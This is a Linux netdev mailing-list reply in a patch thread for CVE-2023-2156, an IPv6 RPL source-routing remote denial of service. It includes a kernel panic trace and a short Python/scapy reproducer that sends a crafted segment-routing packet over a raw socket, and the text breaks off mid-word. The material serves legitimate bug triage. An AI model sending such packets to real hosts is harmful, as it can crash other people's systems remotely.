Return-Path: <netdev+bounces-12131-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id DE3B87365D7
	for <lists+netdev@lfdr.de>; Tue, 20 Jun 2023 10:12:35 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id C61751C20B61
	for <lists+netdev@lfdr.de>; Tue, 20 Jun 2023 08:12:34 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 8F6FB8483;
	Tue, 20 Jun 2023 08:12:32 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 82DBF46A5
	for <netdev@vger.kernel.org>; Tue, 20 Jun 2023 08:12:32 +0000 (UTC)
Received: from szxga08-in.huawei.com (szxga08-in.huawei.com [45.249.212.255])
	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 9078310E4
	for <netdev@vger.kernel.org>; Tue, 20 Jun 2023 01:12:29 -0700 (PDT)
Received: from canpemm500010.china.huawei.com (unknown [172.30.72.57])
	by szxga08-in.huawei.com (SkyGuard) with ESMTP id 4QlfW93JHkz1FDf8;
	Tue, 20 Jun 2023 16:12:21 +0800 (CST)
Received: from [10.174.179.191] (10.174.179.191) by
 canpemm500010.china.huawei.com (7.192.105.118) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.27; Tue, 20 Jun 2023 16:12:26 +0800
Message-ID: <c41403a9-c2f6-3b7e-0c96-e1901e605cd0@huawei.com>
Date: Tue, 20 Jun 2023 16:12:26 +0800
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101
 Thunderbird/102.2.0
Subject: Re: [PATCH v2 net] ipv6: rpl: Fix Route of Death.
To: Kuniyuki Iwashima <kuniyu@amazon.com>, "David S. Miller"
	<davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub Kicinski
	<kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, David Ahern
	<dsahern@kernel.org>
CC: Alexander Aring <alex.aring@gmail.com>, Kuniyuki Iwashima
	<kuni1840@gmail.com>, <netdev@vger.kernel.org>
References: <20230605180617.67284-1-kuniyu@amazon.com>
From: wangyufen <wangyufen@huawei.com>
In-Reply-To: <20230605180617.67284-1-kuniyu@amazon.com>
Content-Type: text/plain; charset="UTF-8"; format=flowed
Content-Transfer-Encoding: 8bit
X-Originating-IP: [10.174.179.191]
X-ClientProxiedBy: dggems703-chm.china.huawei.com (10.3.19.180) To
 canpemm500010.china.huawei.com (7.192.105.118)
X-CFilter-Loop: Reflected
X-Spam-Status: No, score=-4.3 required=5.0 tests=BAYES_00,NICE_REPLY_A,
	RCVD_IN_DNSWL_MED,SPF_HELO_NONE,SPF_PASS,T_SCC_BODY_TEXT_LINE,
	URIBL_BLOCKED autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net



在 2023/6/6 2:06, Kuniyuki Iwashima 写道:
> A remote DoS vulnerability of RPL Source Routing is assigned CVE-2023-2156.
> 
> The Source Routing Header (SRH) has the following format:
> 
>    0                   1                   2                   3
>    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
>    |  Next Header  |  Hdr Ext Len  | Routing Type  | Segments Left |
>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
>    | CmprI | CmprE |  Pad  |               Reserved                |
>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
>    |                                                               |
>    .                                                               .
>    .                        Addresses[1..n]                        .
>    .                                                               .
>    |                                                               |
>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
> 
> The originator of an SRH places the first hop's IPv6 address in the IPv6
> header's IPv6 Destination Address and the second hop's IPv6 address as
> the first address in Addresses[1..n].
> 
> The CmprI and CmprE fields indicate the number of prefix octets that are
> shared with the IPv6 Destination Address.  When CmprI or CmprE is not 0,
> Addresses[1..n] are compressed as follows:
> 
>    1..n-1 : (16 - CmprI) bytes
>         n : (16 - CmprE) bytes
> 
> Segments Left indicates the number of route segments remaining.  When the
> value is not zero, the SRH is forwarded to the next hop.  Its address
> is extracted from Addresses[n - Segment Left + 1] and swapped with IPv6
> Destination Address.
> 
> When Segment Left is greater than or equal to 2, the size of SRH is not
> changed because Addresses[1..n-1] are decompressed and recompressed with
> CmprI.
> 
> OTOH, when Segment Left changes from 1 to 0, the new SRH could have a
> different size because Addresses[1..n-1] are decompressed with CmprI and
> recompressed with CmprE.
> 
> Let's say CmprI is 15 and CmprE is 0.  When we receive SRH with Segment
> Left >= 2, Addresses[1..n-1] have 1 byte for each, and Addresses[n] has
> 16 bytes.  When Segment Left is 1, Addresses[1..n-1] is decompressed to
> 16 bytes and not recompressed.  Finally, the new SRH will need more room
> in the header, and the size is (16 - 1) * (n - 1) bytes.
> 
> Here the max value of n is 255 as Segment Left is u8, so in the worst case,
> we have to allocate 3825 bytes in the skb headroom.  However, now we only
> allocate a small fixed buffer that is IPV6_RPL_SRH_WORST_SWAP_SIZE (16 + 7
> bytes).  If the decompressed size overflows the room, skb_push() hits BUG()
> below [0].
> 
> Instead of allocating the fixed buffer for every packet, let's allocate
> enough headroom only when we receive SRH with Segment Left 1.
> 
> [0]:
> 
> Fixes: 8610c7c6e3bd ("net: ipv6: add support for rpl sr exthdr")
> Reported-by: Max VA
> Closes: https://www.interruptlabs.co.uk/articles/linux-ipv6-route-of-death
> Signed-off-by: Kuniyuki Iwashima <kuniyu@amazon.com>
> ---
> To maintainers:
> Please complement the Reported-by address from the security@ mailing list
> if possible, which checkpatch will complain about.
> 
> v2:
>    * Reload oldhdr@ after pskb_expand_head() (Eric Dumazet)
> 
> v1: https://lore.kernel.org/netdev/20230605144040.39871-1-kuniyu@amazon.com/
> ---

When I tested the linux-ipv6-route-of-death issue on Linux 6.4-rc7, I 
got the following panic:

[ 2046.147186] BUG: kernel NULL pointer dereference, address: 
0000000000000000
[ 2046.147978] #PF: supervisor read access in kernel mode
[ 2046.148522] #PF: error_code(0x0000) - not-present page
[ 2046.149082] PGD 8000000187886067 P4D 8000000187886067 PUD 187887067 
PMD 0
[ 2046.149788] Oops: 0000 [#1] PREEMPT SMP PTI
[ 2046.150233] CPU: 4 PID: 2093 Comm: python3 Not tainted 6.4.0-rc7 #15
[ 2046.150964] Hardware name: Red Hat KVM, BIOS 0.5.1 01/01/2011
[ 2046.151566] RIP: 0010:icmp6_send+0x691/0x910
[ 2046.152029] Code: 78 0f 13 95 48 c7 c7 d0 a0 d4 95 e8 39 e4 ab ff e9 
81 fe ff ff 48 8b 43 58 48 83 e0 fe 0f 84 bf fa ff ff 48 8b 80 d0 00 00 
00 <48> 8b 00 8b 80 e0 00 00 00 89 85 f0 fe ff ff e9 a4 fa ff ff 0f b7
[ 2046.153892] RSP: 0018:ffffb463c01b0b90 EFLAGS: 00010286
[ 2046.154432] RAX: 0000000000000000 RBX: ffff907d03099700 RCX: 
0000000000000000
[ 2046.155160] RDX: 0000000000000021 RSI: 0000000000000000 RDI: 
0000000000000001
[ 2046.155881] RBP: ffffb463c01b0cb0 R08: 0000000000020021 R09: 
0000000000000040
[ 2046.156611] R10: ffffb463c01b0cd0 R11: 000000000000a600 R12: 
ffff907d21a28888
[ 2046.157340] R13: ffff907d21a28870 R14: ffff907d21a28878 R15: 
ffffffff97b03d00
[ 2046.158064] FS:  00007ff3341ba740(0000) GS:ffff908018300000(0000) 
knlGS:0000000000000000
[ 2046.158895] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2046.159483] CR2: 0000000000000000 CR3: 0000000109a5a000 CR4: 
00000000000006e0
[ 2046.160205] Call Trace:
[ 2046.160467]  <IRQ>
[ 2046.160693]  ? __die_body+0x1b/0x60
[ 2046.161059]  ? page_fault_oops+0x15b/0x470
[ 2046.161488]  ? fixup_exception+0x22/0x330
[ 2046.161901]  ? exc_page_fault+0x65/0x150
[ 2046.162318]  ? asm_exc_page_fault+0x22/0x30
[ 2046.162750]  ? icmp6_send+0x691/0x910
[ 2046.163137]  ? ip6_route_input+0x187/0x210
[ 2046.163560]  ? __pfx_free_object_rcu+0x10/0x10
[ 2046.164019]  ? __call_rcu_common.constprop.0+0x10a/0x5a0
[ 2046.164568]  ? _raw_spin_lock_irqsave+0x19/0x50
[ 2046.165034]  ? __pfx_free_object_rcu+0x10/0x10
[ 2046.165499]  ? ip6_pkt_drop+0xf2/0x1c0
[ 2046.165890]  ip6_pkt_drop+0xf2/0x1c0
[ 2046.166269]  ipv6_rthdr_rcv+0x122d/0x1310
[ 2046.166684]  ip6_protocol_deliver_rcu+0x4bc/0x630
[ 2046.167173]  ip6_input_finish+0x40/0x60
[ 2046.167568]  ip6_input+0x3b/0xd0
[ 2046.167905]  ? ip6_rcv_core.isra.0+0x2cb/0x5e0
[ 2046.168368]  ipv6_rcv+0x53/0x100
[ 2046.168706]  __netif_receive_skb_one_core+0x63/0xa0
[ 2046.169231]  process_backlog+0xa8/0x150
[ 2046.169626]  __napi_poll+0x2c/0x1b0
[ 2046.169991]  net_rx_action+0x260/0x330
[ 2046.170385]  ? kvm_sched_clock_read+0x5/0x20
[ 2046.170824]  ? kvm_clock_read+0x14/0x30
[ 2046.171226]  __do_softirq+0xe6/0x2d1
[ 2046.171596]  do_softirq+0x80/0xa0
[ 2046.171944]  </IRQ>
[ 2046.172178]  <TASK>
[ 2046.172406]  __local_bh_enable_ip+0x73/0x80
[ 2046.172829]  __dev_queue_xmit+0x331/0xd40
[ 2046.173246]  ? __local_bh_enable_ip+0x37/0x80
[ 2046.173692]  ? ___neigh_create+0x60b/0x8d0
[ 2046.174114]  ? eth_header+0x26/0xc0
[ 2046.174489]  ip6_finish_output2+0x1e7/0x680
[ 2046.174916]  ? asm_sysvec_apic_timer_interrupt+0x16/0x20
[ 2046.175462]  ip6_finish_output+0x1df/0x350
[ 2046.175881]  ? nf_hook_slow+0x40/0xc0
[ 2046.176274]  ip6_output+0x6e/0x140
[ 2046.176627]  ? __pfx_ip6_finish_output+0x10/0x10
[ 2046.177096]  rawv6_sendmsg+0x6f9/0x1210
[ 2046.177497]  ? dl_cpu_busy+0x2f3/0x300
[ 2046.177886]  ? __pfx_dst_output+0x10/0x10
[ 2046.178305]  ? _raw_spin_unlock_irqrestore+0x1e/0x40
[ 2046.178825]  ? __wake_up_common_lock+0x91/0xd0
[ 2046.179339]  ? sock_sendmsg+0x8b/0xa0
[ 2046.179791]  ? __pfx_rawv6_sendmsg+0x10/0x10
[ 2046.180246]  sock_sendmsg+0x8b/0xa0
[ 2046.180610]  __sys_sendto+0xfa/0x170
[ 2046.180983]  ? __bitmap_weight+0x4b/0x60
[ 2046.181399]  ? task_mm_cid_work+0x183/0x200
[ 2046.181827]  __x64_sys_sendto+0x25/0x30
[ 2046.182228]  do_syscall_64+0x3b/0x90
[ 2046.182599]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
[ 2046.183109] RIP: 0033:0x7ff3344a668a
[ 2046.183493] Code: 48 c7 c0 ff ff ff ff eb bc 0f 1f 80 00 00 00 00 f3 
0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 15 b8 2c 00 00 00 0f 
05 <48> 3d 00 f0 ff ff 77 76 c3 0f 1f 44 00 00 55 48 83 ec 30 44 89 4c
[ 2046.185326] RSP: 002b:00007ffc82a34658 EFLAGS: 00000246 ORIG_RAX: 
000000000000002c
[ 2046.186083] RAX: ffffffffffffffda RBX: 00007ffc82a346f0 RCX: 
00007ff3344a668a
[ 2046.186799] RDX: 0000000000000060 RSI: 00007ff33112db00 RDI: 
0000000000000003
[ 2046.187515] RBP: 000000000159cd90 R08: 00007ffc82a34770 R09: 
000000000000001c
[ 2046.188230] R10: 0000000000000000 R11: 0000000000000246 R12: 
0000000000000000
[ 2046.188958] R13: 0000000000000000 R14: 00007ffc82a346f0 R15: 
0000000000451072
[ 2046.189675]  </TASK>
[ 2046.189909] Modules linked in: fuse rfkill binfmt_misc cirrus 
drm_shmem_helper joydev drm_kms_helper sg syscopyarea sysfillrect 
sysimgblt virtio_balloon serio_raw squashfs parport_pc ppdev lp parport 
ramoops reed_solomon drm ip_tables x_tables xfs sd_mod t10_pi 
crc64_rocksoft crc64 ata_generic ata_piix virtio_net net_failover 
failover libata e1000 i2c_piix4
[ 2046.193039] CR2: 0000000000000000
[ 2046.193400] ---[ end trace 0000000000000000 ]---
[ 2046.193870] RIP: 0010:icmp6_send+0x691/0x910
[ 2046.194315] Code: 78 0f 13 95 48 c7 c7 d0 a0 d4 95 e8 39 e4 ab ff e9 
81 fe ff ff 48 8b 43 58 48 83 e0 fe 0f 84 bf fa ff ff 48 8b 80 d0 00 00 
00 <48> 8b 00 8b 80 e0 00 00 00 89 85 f0 fe ff ff e9 a4 fa ff ff 0f b7
[ 2046.196146] RSP: 0018:ffffb463c01b0b90 EFLAGS: 00010286
[ 2046.196672] RAX: 0000000000000000 RBX: ffff907d03099700 RCX: 
0000000000000000
[ 2046.197388] RDX: 0000000000000021 RSI: 0000000000000000 RDI: 
0000000000000001
[ 2046.198096] RBP: ffffb463c01b0cb0 R08: 0000000000020021 R09: 
0000000000000040
[ 2046.198825] R10: ffffb463c01b0cd0 R11: 000000000000a600 R12: 
ffff907d21a28888
[ 2046.199537] R13: ffff907d21a28870 R14: ffff907d21a28878 R15: 
ffffffff97b03d00
[ 2046.200253] FS:  00007ff3341ba740(0000) GS:ffff908018300000(0000) 
knlGS:0000000000000000
[ 2046.201044] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2046.201624] CR2: 0000000000000000 CR3: 0000000109a5a000 CR4: 
00000000000006e0
[ 2046.202340] Kernel panic - not syncing: Fatal exception in interrupt
[ 2046.203655] Kernel Offset: 0x12e00000 from 0xffffffff81000000 
(relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[ 2046.204731] ---[ end Kernel panic - not syncing: Fatal exception in 
interrupt ]---


The test procedure is as follows:
# sysctl -a | grep -i rpl_seg_enabled
net.ipv6.conf.all.rpl_seg_enabled = 1
net.ipv6.conf.default.rpl_seg_enabled = 1
net.ipv6.conf.dummy0.rpl_seg_enabled = 1
net.ipv6.conf.ens3.rpl_seg_enabled = 1
net.ipv6.conf.ens4.rpl_seg_enabled = 1
net.ipv6.conf.erspan0.rpl_seg_enabled = 1
net.ipv6.conf.gre0.rpl_seg_enabled = 1
net.ipv6.conf.gretap0.rpl_seg_enabled = 1
net.ipv6.conf.ip6_vti0.rpl_seg_enabled = 1
net.ipv6.conf.ip6gre0.rpl_seg_enabled = 1
net.ipv6.conf.ip6tnl0.rpl_seg_enabled = 1
net.ipv6.conf.ip_vti0.rpl_seg_enabled = 1
net.ipv6.conf.lo.rpl_seg_enabled = 1
net.ipv6.conf.sit0.rpl_seg_enabled = 1
net.ipv6.conf.tunl0.rpl_seg_enabled = 1

# python3
Python 3.8.10 (default, Nov 14 2022, 12:59:47)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
 >>> from scapy.all import *
 >>> import socket
 >>> DST_ADDR = "fe80::266:88ff:fe99:7419"
 >>> SRC_ADDR = DST_ADDR
 >>> sockfd = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 
socket.IPPROTO_RAW)
 >>> p = IPv6(src=SRC_ADDR, dst=DST_ADDR) / 
IPv6ExtHdrSegmentRouting(type=3, addresses=["a8::", "a7::", "a6::"], 
segleft=1, lastentry=0xf0)
 >>> sockfd.sendto(bytes(p), (DST_ADDR, 0))

Is this a new issue?
I

